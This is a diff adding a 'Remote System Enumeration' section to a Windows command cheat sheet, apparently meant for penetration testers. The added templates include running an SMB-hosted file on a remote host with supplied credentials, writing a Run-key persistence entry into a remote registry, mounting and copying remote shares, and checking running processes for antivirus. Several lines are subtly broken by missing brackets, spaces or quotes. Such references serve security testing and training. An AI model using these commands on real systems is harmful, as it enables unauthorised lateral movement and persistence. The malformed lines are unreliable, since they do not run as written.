@@ -1,3 +1,14 @@
+
+--- Windows System Enumeration ---
+
+·Operating System Information
+·Process & Service Enumeration
+·Windows Account Enumeration
+·Network Info & Configuration
+·Registry Commands & Important Keys
+·Remote System Enumeration
+
+
 -- Operating System Information --
 
 #Enumerate Windows version information	
@@ -115,12 +126,44 @@ HKLM\Software\Microsoft\Windows NT\CurrentVersion
 
 -- Remote System Enumeration --
 
+# Display sessions for remote system
+net session \\<IP_ADDRESS
 
-....
-....
-....
-....
-....
+# Display logged in user on remote machine
+wmic /node:<IP_ADDRESS> computersystem get username
 
+# Execute file hosted over SMB on remote system with specified credentials
+wmic /node:<IP_ADDRESS> /user:<DOMAIN>\<USERNAME> /password:<PASSWORD> process call create "\\<IP_ADDRESS>\<SHARE_FOLDER>\<FILE_PATH>
 
+# Display process listing every second for remote machine
+wmic /node:<IP_ADDRESS> process list brief /every:1
 
+# Query remote registry
+reg query \\<IP_ADDRESS>\<REG_HIVE>\<REG_KEY> /v <REG_VALUE>
+
+# Display process listing on remote system
+tasklist /S <IP_ADDRESS> /v
+
+# Display system information for remote system
+systeminfo /S <IP_ADDRESS> /U <DOMAIN>\<USERNAME> /P <PASSWORD>
+
+# Display shares of remote computer
+net view \\<IP_ADDRESS> /all
+
+# Connect to remote filesystem with specified user account
+net use * \\<IP_ADDRESS>\<SHARE_FOLDER> /user:<DOMAIN>\<USERNAME><PASSWORD>
+
+# Add registry key to remote system
+REG ADD "\\<IP_ADDRESS>\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"/V "My App" /t REG_SZ /F /D "<FILE_PATH>"
+
+# Copy remote folder
+xcopy /s \\<IP_ADDRESS>\<SHARE_FOLDER><LOCAL_DIR>
+
+# Display system uptime - look for creation date of pagefile.sys. This is the last time the system started
+dir \\<IP_ADDRESS>\c$
+
+# Display processes (look for AV, logged on users, programs of interest, etc.)
+tasklist /v /s <IP_ADDRESS>
+
+# Display system architecture - Presence of "Program Files (x86)" means 64-bit system
+dir \\<IP_ADDRESS>\c$
